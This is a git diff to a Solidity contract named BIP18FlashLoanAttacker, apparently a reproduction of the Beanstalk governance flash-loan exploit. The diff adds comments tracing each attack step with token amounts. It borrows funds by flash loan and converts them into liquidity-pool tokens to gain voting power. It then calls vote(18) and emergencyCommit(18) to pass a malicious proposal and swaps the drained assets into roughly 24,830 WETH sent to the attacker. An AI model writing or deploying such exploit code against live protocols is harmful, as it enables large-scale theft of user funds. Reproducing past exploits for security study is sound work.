@@ -4,6 +4,7 @@ import {FlashLoanReceiverBase} from "./FlashLoanReceiverBase.sol";
 import {ILendingPool} from "./interfaces/ILendingPool.sol";
 import {IERC20} from "./interfaces/IERC20.sol";
 import {ILendingPoolAddressesProvider} from "./interfaces/ILendingPoolAddressesProvider.sol";
+
 // import "hardhat/console.sol";
 
 interface IDiamondCut {
@@ -190,7 +191,7 @@ contract BIP18FlashLoanAttacker is FlashLoanReceiverBase, IUniswapV2Callee {
         /*                  Turn WETH TO Beans                    */
         /* ------------------------------------------------------ */
         uint256 beansBalance = beans.balanceOf(address(uniSwapBeansWethPair));
-        uniSwapBeansWethPair.swap(
+        uniSwapBeansWethPair.swap( // callback -> uniswapV2Call
             0,
             (beansBalance * 99) / 100,
             address(this),
@@ -291,6 +292,7 @@ contract BIP18FlashLoanAttacker is FlashLoanReceiverBase, IUniswapV2Callee {
     }
 
     function addCurve3PoolLiquidity() private {
+        // curve3pool.add_liquidity 350,000,000 DAI, 500,000,000 USDC, 150,000,000 USDT to get 979,691,328 3Crv
         uint256 daiBalance = DAI.balanceOf(address(this));
         uint256 usdcBalance = USDC.balanceOf(address(this));
         uint256 usdtBalance = USDT.balanceOf(address(this));
@@ -306,11 +308,13 @@ contract BIP18FlashLoanAttacker is FlashLoanReceiverBase, IUniswapV2Callee {
     }
 
     function exchange3CrvToLusd() private {
+        // LUSD3CRV-f.exchange to convert 15,000,000 3Crv to 15, 251,318 LUSD
         Curve3Crv.approve(address(curveExchange), UINT256_MAX);
         curveExchange.exchange(1, 0, 15000000e18, 0);
     }
 
     function addLiquidityToBeans3CrvPool() private {
+        // BEAN3CRV-f.add_liquidity to convert 964,691,328 3Crv to 795,425,740 BEAN3CRV-f
         uint256 curve3CrvBalance = Curve3Crv.balanceOf(address(this));
         Curve3Crv.approve(address(curveBeans3CrvPool), UINT256_MAX);
         uint256[2] memory amounts;
@@ -319,6 +323,7 @@ contract BIP18FlashLoanAttacker is FlashLoanReceiverBase, IUniswapV2Callee {
     }
 
     function addLiquidityToBeansLusdCurvePool() private {
+        // BEANLUSD-f.add_liquidity to convert 32,100,950 BEAN and 26,894,383 LUSD and get 58,924,887 BEANLUSD-f
         uint256 lusdBalance = LUSD.balanceOf(address(this));
         uint256 beansBalance = beans.balanceOf(address(this));
         beans.approve(address(curveBeansLusdPool), UINT256_MAX);
@@ -330,6 +335,9 @@ contract BIP18FlashLoanAttacker is FlashLoanReceiverBase, IUniswapV2Callee {
     }
 
     function depositVoteAndExecute() private {
+        // Deposit 795,425,740 BEAN3CRV-f and 58,924,887 BEANLUSD-f into Diamond
+        // Diamond.vote (bip=18)
+        // Diamond.emergencyCommit(bip=18) and hacker proposed _init contract is executed to get 36,084,584 BEAN and 0.54 UNI-V2_WETH_BEAN, 874,663,982 BEAN3CRV-f, 60,562,844 BEANLUSD-f to hacker contract
         depositForVotingPower();
         beanstalkProtocol.vote(18);
         beanstalkProtocol.emergencyCommit(18);
@@ -356,7 +364,18 @@ contract BIP18FlashLoanAttacker is FlashLoanReceiverBase, IUniswapV2Callee {
     }
 
     function _swapAllTokensEarnedToETH() internal {
-        // 獲利了結
+        // BEAN3CRV-f.remove_liquidity_one_coin 874,663,982 BEAN3CRV-f to get 1,007,734,729 3Crv
+        // BEANLUSD-f.remove_liquidity_one_coin 60,562,844 BEANLUSD-f to get 28,149,504 LUSD
+        // Flashloan back LUSD 11,795,706 and BEAN 32,197,543
+        // LUSD3CRV-f.exchange to swap 16,471,404 LUSD to 16,184,690 3Crv
+        // Burn 16,184,690 3Cry to get 522,487,380 USDC, 365,758,059 DAI, and 156,732,232 USDT
+        // Flashloan back 150,135,000 USDT, 500,450,000 USDC, 350,315,000 DAI
+        // Burn UNI-V2_WETH_BEAN 0.54 to get 10,883 WETH and 32,511,085 BEAN
+        // Donate 250,000 USDC to Ukraine Crypto Donation
+        // swap 15,443,059 DAI to 15,441,256 USDC
+        // swap 37, 228,637 USDC to 11,822 WETH
+        // Swap 6,597,232 USDT to 2,124 WETH
+        // Profit 24,830 WETH is sent to hacker
         uint256 daiBalance = DAI.balanceOf(address(this));
         uint256 usdcBalance = USDC.balanceOf(address(this));
         uint256 usdtBalance = USDT.balanceOf(address(this));
